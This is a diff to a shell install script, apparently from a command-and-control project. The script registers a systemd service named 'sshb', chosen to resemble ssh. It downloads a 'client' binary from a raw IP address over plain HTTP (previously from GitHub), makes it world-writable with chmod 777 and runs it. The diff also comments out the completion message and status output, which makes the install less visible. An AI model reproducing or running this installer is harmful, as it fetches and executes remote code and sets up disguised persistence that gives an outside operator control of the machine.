@@ -12,9 +12,9 @@ systemctl daemon-reload
 systemctl enable sshb
 systemctl start sshb
 #Curl the binary file to sshb
-curl https://raw.githubusercontent.com/drew-young/C2-Project/main/client > /var/lib/sshb/sshb
+curl 129.21.49.57:8080/client > /var/lib/sshb/sshb
 chmod 777 /var/lib/sshb/sshb
 /var/lib/sshb/sshb
 #Tell the user you finished
-echo Finished install!
-systemctl status sshb
+# echo Finished install!
+# systemctl status sshb
